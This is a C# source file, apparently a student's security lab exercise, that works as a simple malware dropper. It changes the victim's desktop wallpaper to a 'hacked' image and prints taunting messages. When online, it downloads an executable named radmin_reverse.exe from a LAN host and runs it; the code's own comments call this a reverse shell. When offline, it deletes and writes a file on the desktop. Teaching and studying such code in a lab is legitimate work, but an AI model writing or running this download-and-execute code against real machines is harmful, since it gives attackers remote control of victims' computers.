using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Threading;
using System.Diagnostics;


//using Tulpep.NotificationWindows;
namespace SetWallpaper
{
    class Program
    {
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool SystemParametersInfo(uint uiAction, uint uiParam, String pvParam, uint fWinIni);

        private const uint SPI_SETDESKWALLPAPER = 0x14;
        private const uint SPIF_UPDATEINIFILE = 0x1;
        private const uint SPIF_SENDWININICHANGE = 0x2;

       
       
        //Display Picture Function
        private static void DisplayPicture(string file_name)
        {
            uint flags = 0;
            if (!SystemParametersInfo(SPI_SETDESKWALLPAPER,
                    0, file_name, flags))
            {
                Console.WriteLine("Error");
            }

        }

        //Check Connection Function
        public static bool CheckInternetConnection()
        {
            try
            {
                using (var client = new WebClient())
                using (var stream = client.OpenRead("http://www.google.com")) ;
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }

      
        static void Main(string[] args)
        {

            //Set wallpaper on victim desktop
            string photo = @"C:\Users\ADMIN\Downloads\hacked.JPG";
            DisplayPicture(photo);

            //Check connection
            //If connected, download and excute reverse shell
            if (CheckInternetConnection())
            {
                Console.WriteLine("Damn bro, u have been infected virus!!!!!! Your wallpaper is changed :}~");

                //Download Payload
                WebClient wc = new WebClient();
                string filename = Path.GetFileName("http://192.168.23.131/radmin_reverse.exe");
                wc.DownloadFile("http://192.168.23.131/radmin_reverse.exe", @"C:\Users\ADMIN\Downloads\radmin_reverse.exe");
                System.Diagnostics.Process.Start(@"C:\Users\ADMIN\Downloads\radmin_reverse.exe");
                
            }       
            //If disconnected, create a file on desktop
            else
            {
                Console.WriteLine("I have a gift for you on your Desktop :)");
           
                //Making file on Desktop
                string fileName = @"C:\Users\ADMIN\OneDrive - Trường ĐH CNTT - University of Information Technology\Nhạc Nhẽo\Máy tính\Demo_Lab2_bai2.txt";
                try
                {
                    // Check if file already exists. If yes, delete it.     
                    if (File.Exists(fileName))
                    {
                        File.Delete(fileName);
                    }

                    // Create a new file     
                    using (FileStream fs = File.Create(fileName))
                    {
                        // Add some text to file    
                        Byte[] title = new UTF8Encoding(true).GetBytes("18520551");
                        fs.Write(title, 0, title.Length);
                        byte[] author = new UTF8Encoding(true).GetBytes("Doan Van Dac");
                        fs.Write(author, 0, author.Length);
                    }

                    // Open the stream and read it back.    
                    using (StreamReader sr = File.OpenText(fileName))
                    {
                        string s = "";
                        while ((s = sr.ReadLine()) != null)
                        {
                            Console.WriteLine(s);
                        }
                    }
                }
                catch (Exception Ex)
                {
                    Console.WriteLine(Ex.ToString());
                }
            }
            Console.ReadKey();
            

           
        }


    }
}
    

